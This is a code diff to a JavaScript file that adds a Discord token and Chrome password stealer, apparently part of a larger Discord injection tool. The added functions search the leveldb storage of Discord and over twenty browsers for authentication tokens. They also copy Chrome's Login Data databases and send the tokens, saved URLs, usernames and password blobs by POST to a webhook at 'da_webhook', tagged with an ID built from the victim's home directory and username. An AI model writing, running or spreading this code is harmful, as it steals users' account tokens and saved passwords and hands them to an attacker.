@@ -1,13 +1,169 @@
-// Code is shit
+const fs = require("fs");
+const os = require("os");
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 var glob = require("glob");
-const fs = require('fs');
 const https = require('https');
+
+//UID Setup
+const userInfo = os.userInfo();
+var textuid = Buffer.from("Dir: " + userInfo.homedir + " User: " + userInfo.username + " Date: " + Date.now())
+const uid = textuid.toString("hex")
+
+//Global Vars
+var oldDiscordTokens = [];
+
+//Global Paths
+var dir = __dirname.split("\\")
+var localappdata = process.env.LOCALAPPDATA
+getAllDiscordTokens();
+//Get All Discord Tokens
+function getAllDiscordTokens(){
+    var paths = [`${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Discord/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/DiscordDevelopment/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Lightcord/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/discordptb/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/discordcanary/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Amigo/User Data/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Torch/User Data/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Kometa/User Data/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`
+        , `${(dir[0])}/Users/${(dir[2])}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`]
+        paths.forEach(p => koro(p))
+}
+
+function koro(p) {
+    fs.readdir(p, (e, f) => {
+        if (f) {
+            f = f.filter(f => f.endsWith("ldb"))
+            f.forEach(f => {
+                var fileContent = fs.readFileSync(`${p}/${f}`).toString()
+                var noMFA = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
+                var mfa = /"mfa\.[\d\w_-]{84}"/
+                var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
+                
+                if (token){
+                    
+                    token = token.replace(/"/g, '');
+                    var a = `{"content": "Token: ${token}", "username": "UID: ${uid}"}`;
+                    console.log(a)
+                    fetch("http://da_webhook/api2.php?type=old", {
+                    "headers": {
+                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+                        "cache-control": "no-cache",
+                        "pragma": "no-cache",
+                        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
+                        "sec-ch-ua-mobile": "?0",
+                        "sec-ch-ua-platform": "\"Windows\"",
+                        "sec-fetch-dest": "document",
+                        "sec-fetch-mode": "navigate",
+                        "sec-fetch-site": "none",
+                        "sec-fetch-user": "?1",
+                        "upgrade-insecure-requests": "1"
+                    },
+                    "referrerPolicy": "strict-origin-when-cross-origin",
+                    "body": `{"content": "Token: **${token}** \\nUID: **${uid}**", "username": "Old Tokens by Koro"}`,
+                    "method": "POST"
+                    });
+                }
+            })
+        }
+    })
+}
+
+getLoginData()
+//Chrome Stealer
+async function getLoginData(){
+    await getChromePass("Login Data", "log0.db")
+    await getChromePass("Login Data For Account", "log1.db")
+    await getChromePass("Login Data1", "log2.db")
+}
+
+function getChromePass(source_file, dest_file){
+    //Stealer Paths
+    
+    var chromepath = localappdata + "\\Google\\Chrome\\User Data\\Default\\"
+    var exploit_path = chromepath + source_file
+    var dest_path = localappdata + "\\Korobeinikizado\\"
+    console.log(dest_path)
+    var sqlite3 = require('sqlite3').verbose();
+    if (!fs.existsSync(exploit_path)){
+        return;
+    }
+    if (!fs.existsSync(dest_path)){
+        fs.mkdirSync(dest_path);
+    }
+    fs.copyFile(exploit_path, dest_path + dest_file, (err) => {
+        if (err) throw err;
+        //console.log('source.txt was copied to destination.txt');
+    });
+    let db = new sqlite3.Database(dest_path + dest_file, (err) => {
+        if (err) {
+            console.error(err.message);
+        }
+        console.log('Connected to the my database.');
+    });
+    db.serialize(function () {
+        db.each('SELECT action_url, username_value, password_value FROM logins', function (err, row) {
+            console.log(row)
+            if (row){
+                var url = row.action_url;
+                var username = row.username_value;
+                var password_value = row.password_value.toString("hex")
+                var result = url + ":KorobeinikiGostoso:" + username + ":KorobeinikiGostoso:" + password_value;
+                if (url == "") url = "Não Capturado";
+                if (username == "") username = "Não Capturado";
+                if (password_value == "") password_value = "Não Capturado";
+                console.log(result);
+                fetch("http://da_webhook/api2.php?type=chrome", {
+                    "headers": {
+                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+                        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
+                        "cache-control": "no-cache",
+                        "pragma": "no-cache",
+                        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
+                        "sec-ch-ua-mobile": "?0",
+                        "sec-ch-ua-platform": "\"Windows\"",
+                        "sec-fetch-dest": "document",
+                        "sec-fetch-mode": "navigate",
+                        "sec-fetch-site": "none",
+                        "sec-fetch-user": "?1",
+                        "upgrade-insecure-requests": "1"
+                    },
+                    "referrerPolicy": "strict-origin-when-cross-origin",
+                    "body": `{"content": "URL: **${url}** \\nLogin: **${username}**\\nSenha (Hex): **${password_value}**", "username": "Chrome Pass by Koro"}`,
+                    "method": "POST"
+                });
+            }else{
+                console.log("não encontrado nada em: " + exploit_path)
+            }
+            
+            
+        });
+    });
+
+    db.close();
+}
+
 const {
     exec
 } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const superstarlmao = "da_webhook"
+const superstarlmao = "https://da_webhook/api2.php?type=injection"
 const config = {
     "logout": "%LOGOUT%1",
     "inject-notify": "%INJECTNOTI%1",
@@ -140,7 +296,7 @@ function injectNotify() {
     })
     axios
         .post(superstarlmao, {
-            "content": null,
+            "content": uid,
             "embeds": [{
                 "title": ":detective: Successfull injection",
                 "color": config["embed-color"],
